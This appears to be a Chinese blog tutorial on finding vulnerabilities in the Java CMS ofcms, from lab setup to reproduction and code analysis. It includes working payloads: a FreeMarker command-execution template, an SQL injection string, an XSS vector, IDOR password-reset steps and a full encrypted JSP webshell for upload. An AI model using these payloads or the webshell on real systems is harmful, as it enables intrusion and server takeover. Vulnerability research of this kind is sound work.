## 前言

挖了一些`phpcms`的漏洞了，突然想尝试去挖一下`javacms`的漏洞，于是写下这篇文章来记录一下自己挖洞的一个流程，希望能帮助到一些正在学习挖洞的师傅们。

## 确立目标

挖洞的第一步首先是确立一个目标，也就是找个`cms`来挖，这里可以通过`github`，`gitee`或者谷歌百度直接去搜`cms`。

![image-20220810224523169.png](https://image.3001.net/images/20220817/1660721088_62fc97c04d3f99c01d15f.png!small)

![image-20220810224805721.png](https://image.3001.net/images/20220817/1660721089_62fc97c15c7f751a59e85.png!small)

如果挖洞经验比较少的话建议找一下star少的cms去挖，找到相应的项目，然后点进去，下载源码，然后看项目的介绍，大致了解一下项目的信息和安装的过程。

![image-20220810224838825.png](https://image.3001.net/images/20220817/1660721090_62fc97c25e6e40e9690df.png!small)

## 信息收集

如果确定了目标，接下来我们可以去了解一下他的项目信息，相应的漏洞等。

项目信息除了上面的README以为还可以看看issues模块，这里可能会有一些系统问题或者安装问题，后续我们可能会遇到

![image-20220810225040550.png](https://image.3001.net/images/20220817/1660721091_62fc97c3a2f8f41771e54.png!small)

漏洞信息的话可以通过`cnvd`或者其他漏洞平台（直接百度也可以）去查看该系统的漏洞情况。

![image-20220810225217393.png](https://image.3001.net/images/20220817/1660721092_62fc97c4754ec2770f631.png!small)

或者`cnvd`查看相应的信息，通过查看相应的信息可以提高我们挖洞的效率，我们从中可以知道该项目已经存在漏洞，我们到时候挖就可以看看相应的地方会不会还存在漏洞或者避免挖到别人挖过的漏洞。

![image-20220812102617971.png](https://image.3001.net/images/20220817/1660721093_62fc97c5cc50f2eb558f7.png!small)

## 环境搭建

上面的信息收集完之后我们就要开始搭建环境了，搭建环境是很关键的一步，由于某些`cms`安装过程繁琐或者没写好说明，会导致安装出现很多问题甚至装不上，这里我们要注意项目的文档，如果实在安装有问题可以通过相关渠道去联系一下作者或者相应的`qq`群寻求一下帮助。

【----帮助网安学习，以下所有学习资料免费领！加vx：yj009991，备注“freebuf”获取！】

① 网安学习成长路径思维导图  
② 60+网安经典常用工具包  
③ 100+SRC漏洞分析报告  
④ 150+网安攻防实战技术电子书  
⑤ 最权威CISSP 认证考试指南+题库  
⑥ 超1800页CTF实战技巧手册  
⑦ 最新网安大厂面试题合集（含答案）  
⑧ APP客户端安全检测指南（安卓+IOS）

本次挖掘的漏洞是`ofcms`，首先先下载一下源码，然后解压丢一边，回到网页来看一下项目文档。

### 环境要求

一般项目都会有写环境要求的，我们调整一下就好。

![image-20220810230452849.png](https://image.3001.net/images/20220817/1660721095_62fc97c7725669648853e.png!small)

### 环境准备

环境解压完我们用`idea`打开，如果发现一些重要目录文件不见了，重开一下就有了。

#### 数据库

首先找到`db.properties`，如果不能一眼看到可以通过`ctrl`+`shift`+f来快速搜索

![image-20220810231627267.png](https://image.3001.net/images/20220817/1660721096_62fc97c8819f4d8b85c32.png!small)

    
    
    /ofcms-admin/src/main/resources/dev/conf/db.properties

找到了文件，访问相对应的路径即可，这里我们修改一下数据库用户名和密码，然后点击右边的数据库来测试连接。

![image-20220810231916114.png](https://image.3001.net/images/20220817/1660721097_62fc97c990a029a8b1531.png!small)

然后按数据库信息来修改，然后点击右边的数据库，配置一下。

    
    
    如果出现以下的错误  
    Server returns invalid timezone. Go to 'Advanced' tab and set 'serverTimezone' property manually. 

![image-20220810232119153.png](https://image.3001.net/images/20220817/1660721098_62fc97ca646ce32e6f535.png!small)

这是时区问题，如果配置了环境变量报错，可以通过以下步骤来解决。

    
    
    win+R  
    cmd  
    mysql -hlocalhost -uroot -p  
    （然后输入数据库密码）  
    show variables like'%time_zone';  
    set global time_zone = '+8:00';

![image-20220810232218984.png](https://image.3001.net/images/20220817/1660721099_62fc97cb43719270f6e6e.png!small)

没配置环境变量的，看这个文章

<https://blog.csdn.net/liuqiker/article/details/102455077>

配置成功效果图如下

![image-20220810232240811.png](https://image.3001.net/images/20220817/1660721100_62fc97cc13075bfcded3e.png!small)

#### maven

右键项目找到`mavne`重新加载项目即可

![image-20220811202648083.png](https://image.3001.net/images/20220817/1660721100_62fc97ccf380cfcff0ccd.png!small)

#### tomcat

在run-configuration中配置tomcat

![image-20220811210318285.png](https://image.3001.net/images/20220817/1660721102_62fc97ce0e4ee20119157.png!small)

在`Deployment`配置一下

![image-20220811210824819.png](https://image.3001.net/images/20220817/1660721103_62fc97cf76e7bc38bca3b.png!small)

一切配置好后点击run启动就可以了，如果遇到端口报错改一下端口，其他的报错就百度一下。

### 安装过程

这一步就比较简单了，跟着弄就好了。

![image-20220810234056764.png](https://image.3001.net/images/20220817/1660721104_62fc97d056482e29b2018.png!small)

下一步，然后配置好数据库，这里记得先在数据库中新建个`ofcms`的库，否则会报`Unknown database 'ofcms'`的错。

![image-20220810234239607.png](https://image.3001.net/images/20220817/1660721105_62fc97d1333a45fa739e7.png!small)

在这里，正常安装步骤是建立好数据库，输入账号密码就等待安装就好。

如果出现以下报错，我们可以通过手工导入数据库，这一种情况在安装别的`cms`也很常见，在安装遇到数据库问题我们可以直接导入数据库。

    
    
    You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'DROP TABLE IF EXISTS `of_cms_access`; CREATE TABLE `of_cms_access` ( `access_i' at line 21 

数据库位置`ofcms-master\doc\sql`，选择相应的版本直接拖进`navicat`中，然后导入成功后刷新一下就好。

![image-20220811203610702.png](https://image.3001.net/images/20220817/1660721106_62fc97d21a152caae0e7e.png!small)

接着将数据库配置文件`db-config.properties`文件名修改为`db.properties`，重启一下服务。

![image-20220811212418610.png](https://image.3001.net/images/20220817/1660721107_62fc97d322ee3ea5f0ac6.png!small)

## 漏洞复现

环境搭建完，我们就可以开始挖洞了，然后在这里我建议是能找到该漏洞已存在的文章，我们就先去复现一下，看看别的师傅们的挖过的漏洞，一方面是防止重复，一方面是可以学习一下别人的挖洞思路。

`ofcms`其实存在挺多漏洞的，这里我们就来简单复现一下，大致看看师傅们的挖洞思路。

### 任意文件写入

漏洞模板文件这个位置，漏洞的详细分析可以看看[文章](https://blog.csdn.net/xd_2021/article/details/123611835)

#### 漏洞复现

我们选择任意一个html，然后点击保存抓包，我们可以看到包的信息。

![image-20220812142624926.png](https://image.3001.net/images/20220817/1660721108_62fc97d4283ea5c97b898.png!small)

这里就是写入文件，我们在admin目录下写入eek1.xml文件。

![image-20220812143543139.png](https://image.3001.net/images/20220817/1660721109_62fc97d54d61672fcf586.png!small)

通过上面任意文件读取漏洞去读取一下

![image-20220812143617279.png](https://image.3001.net/images/20220817/1660721110_62fc97d6ded977ba5e95c.png!small)

### 模板注入漏洞

漏洞在模板注入，这个漏洞主要是pom.xml引入了`freemarker-2.3.21`依赖，但是留下一些不安全因素导致的，具体漏洞分析可以看这篇[文章](http://www.wjhsh.net/bmjoker-p-13653563.html)。

#### 漏洞复现

漏洞复现过程比较简单，我们直接在html文件中插入payload就可以了

    
    
    <#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("calc") }

插入后直要访问前台就会出发payload

![image-20220811214421076.png](https://image.3001.net/images/20220817/1660721112_62fc97d84c1dc016e09f7.png!small)

模板注入的知识点可以看看这篇[文章](https://blog.csdn.net/weixin_44522540/article/details/122844068)

通过这一个洞，我们可以挖洞的时候可以去注意一下pom.xml引入的模板。

### SQL注入漏洞

漏洞分析参考[文章](https://blog.csdn.net/xd_2021/article/details/123611835)，由于这里的预编译处理不起作用，所以可以执行SQL语句。

#### 漏洞复现

漏洞点在系统设置---代码生成---添加----添加表，在这里抓一下包

![image-20220812144231426.png](https://image.3001.net/images/20220817/1660721113_62fc97d99df809993cf6a.png!small)

直接把payload输进来

    
    
    update of_cms_ad set ad_id=updatexml(1,concat(1,user()),1)

![image-20220812144328508.png](https://image.3001.net/images/20220817/1660721114_62fc97dab610c9c620273.png!small)

### 任意文件上传

漏洞分析在上一篇文章里有说，这里主要就是利用windows或中间件文件上传特性来避免结尾为`jsp`或`jspx`

#### 漏洞复现

找到一个上传点然后抓包，我这里是在内容管理----栏目管理----新增----新增用户----上传附件这里抓包的。

![image-20220812145141251.png](https://image.3001.net/images/20220817/1660721115_62fc97dba0cf72bb5705f.png!small)

    
    
    eek.jsp  
    <%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if(request.getParameter("pass")!=null){String k=(""+UUID.randomUUID()).replace("-","").substring(16);session.putValue("u",k);out.print(k);return;}Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec((session.getValue("u")+"").getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);%>

![image-20220812150004902.png](https://image.3001.net/images/20220817/1660721116_62fc97dcc0a257337faae.png!small)

可以看到文件上传进去，而且内容没被修改。

## 漏洞挖掘

通过上面的内容，我们学习了别的师傅的挖洞思路，接下来就是我自己的挖洞过程了，下面是我挖的几个洞。

![image-20220812150434742.png](https://image.3001.net/images/20220817/1660721118_62fc97de568617e557444.png!small)

首先除了已经存在的漏洞外，我们要大致知道什么漏洞会存在什么地方，例如登录注册界面会出现`sql`漏洞，逻辑漏洞等，留言框可能会出现`xss`漏洞，上传头像界面可能会出现任意文件上传漏洞等，信息泄露漏洞也可以通过御剑或者其他工具去扫一下。

### XSS漏洞

#### 漏洞复现

对于前台有个客户案例，选择其中一个案例，然后有个留言框，这里直接打入xss的payload就可以了。

    
    
    <video src=x onerror=alert("eek") />

![image-20220812150828600.png](https://image.3001.net/images/20220817/1660721119_62fc97df0de864affdf21.png!small)

#### 漏洞分析

文件位置`ofcms-master\ofcms-api\src\main\java\com\ofsoft\cms\api\v1`

    
    
    package com.ofsoft.cms.api.v1;  
    ​  
    import com.jfinal.plugin.activerecord.Db;  
    import com.ofsoft.cms.api.ApiBase;  
    import com.ofsoft.cms.core.annotation.Action;  
    import com.ofsoft.cms.core.api.ApiMapping;  
    import com.ofsoft.cms.core.api.RequestMethod;  
    import com.ofsoft.cms.core.api.check.ParamsCheck;  
    import com.ofsoft.cms.core.api.check.ParamsCheckType;  
    import com.ofsoft.cms.core.utils.IpKit;  
    import java.util.Map;  
    ​  
    ​  
    /**  
    * 评论接口  
    *  
    * @author OF  
    * @date 2019年2月24日  
    */  
    @Action(path = "/comment")  
    public class CommentApi extends ApiBase {  
    /**  
    * 获取内容信息  
    */  
    @ApiMapping(method = RequestMethod.GET)  
    @ParamsCheck(  
    {@ParamsCheckType(name = "comment_content"), @ParamsCheckType(name = "content_id"),  
    @ParamsCheckType(name = "site_id")})  
    public void save() {  
    try {  
    Map params = getParamsMap();  
    params.put("comment_ip", IpKit.getRealIp(getRequest()));  
    Db.update(Db.getSqlPara("cms.comment.save", params));  
    rendSuccessJson();  
    } catch (Exception e) {  
    e.printStackTrace();  
    rendFailedJson();  
    }  
    }  
    }

请求`/api/v1/comment/save.json?comment_content=123&content_id=61&site_id=1✓_status=1&_=1644130926694`

这里直接接受请求，未对content的内容进行检测，直接将请求的值存入数据库中，导致存在跨站脚本漏洞。

### 逻辑缺陷漏洞1

#### 本地环境

现有两个用户信息，系统管理员admin和普通管理员eek，如下是系统管理员的界面。

    
    
    admin/admin  
    eek/123

![image-20220812151227116.png](https://image.3001.net/images/20220817/1660721119_62fc97dfc96fadce31f95.png!small)

超级管理员后台界面。

![image-20220812151237539.png](https://image.3001.net/images/20220817/1660721120_62fc97e09ee10e4cbd19e.png!small)

普通管理员后台界面

![image-20220812151244717.png](https://image.3001.net/images/20220817/1660721121_62fc97e184e5263a00b11.png!small)

#### 漏洞复现

我们先以普通管理员登录

![image-20220812151322941.png](https://image.3001.net/images/20220817/1660721123_62fc97e341d9187e3ee49.png!small)

点击右上角，修改密码

![image-20220812151332861.png](https://image.3001.net/images/20220817/1660721123_62fc97e3ee4d8b04ad9a6.png!small)

在此处burp抓包

![image-20220812151532874.png](https://image.3001.net/images/20220817/1660721124_62fc97e4d3c32f8b3e8a1.png!small)

修改id为1，密码任意

修改前admin的密码是admin

修改后为admin，密码是eek

![image-20220812151636497.png](https://image.3001.net/images/20220817/1660721126_62fc97e61c4116b5a998e.png!small)

#### 漏洞分析

漏洞文件：`\ofcms-master\ofcms-admin\src\main\java\com\ofsoft\cms\admin\controller\system\SysUserController.java`的`respwd`方法

    
    
    ...      
    public void respwd() {  
    Map<String, Object> params = getParamsMap();  
    String password = (String) params.get("password");  
    String newpassword = (String) params.get("newpassword");  
    if (!password.equals(newpassword)) {  
    rendFailedJson("两次密码不一致!");  
    return;  
    }  
    Record record = new Record();  
    if (!StringUtils.isBlank(password)) {  
    password = new Sha256Hash(password).toHex();  
    record.set("user_password", password);  
    }  
    record.set("user_id", params.get("user_id"));  
    try {  
    Db.update(AdminConst.TABLE_OF_SYS_USER, "user_id", record);  
    rendSuccessJson();  
    } catch (Exception e) {  
    e.printStackTrace();  
    rendFailedJson(ErrorCode.get("9999"));  
    }  
    }...

在此方法中，后台对前端界面的id和两次密码值进行获取，然后传入后端，后端直接将id和密码传入数据库中，让数据库直接更新信息。

这里由于id可控导致用户可以直接修改任意id的密码，导致该地方存在任意用户密码重置。

### 逻辑缺陷漏洞2

#### 本地环境

数据库信息如下图所示

![image-20220812152802265.png](https://image.3001.net/images/20220817/1660721127_62fc97e708fcb150e8fc5.png!small)

    
    
    现在有超级管理员，admin/123  
    ​  
    普通管理员，eek/123

#### 漏洞复现

首先以普通管理员身份登录，然后点击右上角，基本资料

![image-20220812152835568.png](https://image.3001.net/images/20220817/1660721127_62fc97e7cfc9e666fb1fb.png!small)

在此处burp抓包

![image-20220812152841375.png](https://image.3001.net/images/20220817/1660721128_62fc97e8906f8604a6340.png!small)

![image-20220812152843768.png](https://image.3001.net/images/20220817/1660721129_62fc97e96b6be76d43a5f.png!small)

修改信息，user_id改为1，密码修改为admin

![image-20220812152850822.png](https://image.3001.net/images/20220817/1660721130_62fc97ea540ceb3498c5f.png!small)

以系统管理员身份登录

![image-20220812152858427.png](https://image.3001.net/images/20220817/1660721131_62fc97eb81c571ead463e.png!small)

成功登录

![image-20220812152904325.png](https://image.3001.net/images/20220817/1660721134_62fc97ee89caf51ee25bd.png!small)

#### 漏洞分析

漏洞文件：`\ofcms-master\ofcms-admin\src\main\java\com\ofsoft\cms\admin\controller\system\SysUserController.java`的`update`方法

    
    
    ...      
    public void update() {  
    Map<String, Object> params = getParamsMap();  
    String password = (String) params.get("password");  
    if (!StringUtils.isBlank(password)) {  
    password = new Sha256Hash(password).toHex();  
    params.put("user_password", password);  
    }  
    params.remove("password");  
    ​  
    String roleId = (String) params.get("role_id");  
    if (!StringUtils.isBlank(roleId)) {  
    SqlPara sql = Db.getSqlPara("system.user.role_update", params);  
    Db.update(sql);  
    }  
    params.remove("role_id");  
    ​  
    Record record = new Record();  
    record.setColumns(params);  
    try {  
    Db.update(AdminConst.TABLE_OF_SYS_USER, "user_id", record);  
    rendSuccessJson();  
    } catch (Exception e) {  
    e.printStackTrace();  
    rendFailedJson(ErrorCode.get("9999"));  
    }  
    }  
    ...

在此方法中，后台管理直接将新增的数据放到数据库中，直接对数据库内容进行更新，未对不合法内容进行检测，导致该地方存在任意用户信息重置。

### 任意文件读取

#### 漏洞复现

找到模板文件

![image-20220811213339266.png](https://image.3001.net/images/20220817/1660721135_62fc97ef5ea6f2e2ea039.png!small)

所对应的路径是`\ofcms-master\ofcms-admin\src\main\webapp\WEB-INF\page\default`，这里可以通过目录穿越来读取任意文件。

在他的上两级有个`web.xml`文件，我们尝试读取一些。

![image-20220811213412917.png](https://image.3001.net/images/20220817/1660721136_62fc97f02d5435468e5c0.png!small)

这里不能直接编辑，burp抓个包。

`web.xml`文件如下所示

    
    
    <!DOCTYPE web-app PUBLIC  
    "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"  
    "http://td/web-app_2_3.dtd" >  
    ​  
    <web-app>  
    <display-name>Archetype Created Web Application</display-name>  
    <listener>  
    <listener-class>org.apache.shiro.web.env.EnvironmentLoaderListener</listener-class>  
    </listener>  
    <filter>  
    <filter-name>shiro</filter-name>  
    <filter-class>org.apache.shiro.web.servlet.ShiroFilter</filter-class>  
    </filter>  
    .........

读取成功

![image-20220811213905619.png](https://image.3001.net/images/20220817/1660721136_62fc97f0e953274e019d6.png!small)

#### 漏洞分析

漏洞文件位置：`ofcms-master\ofcms-admin\src\main\java\com\ofsoft\cms\admin\controller\cms\TemplateController.java`漏洞位于该模块的`getTemplates`方法中

    
    
    package com.ofsoft.cms.admin.controller.cms;  
    ​  
    ...  
    public void getTemplates() {  
    //当前目录  
    String dirName = getPara("dir","");  
    //上级目录  
    String upDirName = getPara("up_dir","/");  
    //类型区分  
    String resPath = getPara("res_path");  
    //文件目录  
    String dir = null;  
    if(!"/".equals(upDirName)){  
    dir = upDirName+dirName;  
    }else{  
    dir = dirName;  
    }  
    File pathFile = null;  
    if("res".equals(resPath)){  
    pathFile = new File(SystemUtile.getSiteTemplateResourcePath(),dir);  
    }else {  
    pathFile = new File(SystemUtile.getSiteTemplatePath(),dir);  
    }  
    ​  
    File[] dirs = pathFile.listFiles(new FileFilter() {  
    @Override  
    public boolean accept(File file) {  
    return file.isDirectory();  
    }  
    });  
    if(StringUtils.isBlank (dirName)){  
    upDirName = upDirName.substring(upDirName.indexOf("/"),upDirName.lastIndexOf("/"));  
    }  
    setAttr("up_dir_name",upDirName);  
    setAttr("up_dir","".equals(dir)?"/":dir);  
    setAttr("dir_name",dirName.equals("")?SystemUtile.getSiteTemplatePathName():dirName);  
    setAttr("dirs", dirs);  
    /*if (dirName != null) {  
    pathFile = new File(pathFile, dirName);  
    }*/  
    File[] files = pathFile.listFiles(new FileFilter() {  
    @Override  
    public boolean accept(File file) {  
    return !file.isDirectory() && (file.getName().endsWith(".html") || file.getName().endsWith(".xml")  
    || file.getName().endsWith(".css") || file.getName().endsWith(".js"));  
    }  
    });  
    setAttr("files", files);  
    String fileName = getPara("file_name", "index.html");  
    File editFile = null;  
    if (fileName != null && files != null && files.length > 0) {  
    for (File f : files) {  
    if (fileName.equals(f.getName())) {  
    editFile = f;  
    break;  
    }  
    }  
    if (editFile == null) {  
    editFile = files[0];  
    fileName = editFile.getName();  
    }  
    }  
    ​  
    setAttr("file_name", fileName);  
    if (editFile != null) {  
    String fileContent = FileUtils.readString(editFile);  
    if (fileContent != null) {  
    fileContent = fileContent.replace("<", "&amplt").replace(">", "&ampgt");  
    setAttr("file_content", fileContent);  
    setAttr("file_path", editFile);  
    }  
    }  
    if("res".equals(resPath)) {  
    render("/admin/cms/template/resource.html");  
    }else{  
    render("/admin/cms/template/index.html");  
    }  
    }  
    ......

这里没有对dir和dir_name的值进行不合法输入检测，导致这里可以进行目录穿越，然后后面的就只有对文件是否存在进行判断，若存在则读取。所以此处存在任意文件读取漏洞。

 **声明：本文仅限于技术讨论与分享，严禁用于非法途径。若读者因此作出任何危害网络安全行为后果自负，与本号及原作者无关。**

 **更多网安技能的在线实操练习，[请点击这里>>](https://www.hetianlab.com/)**

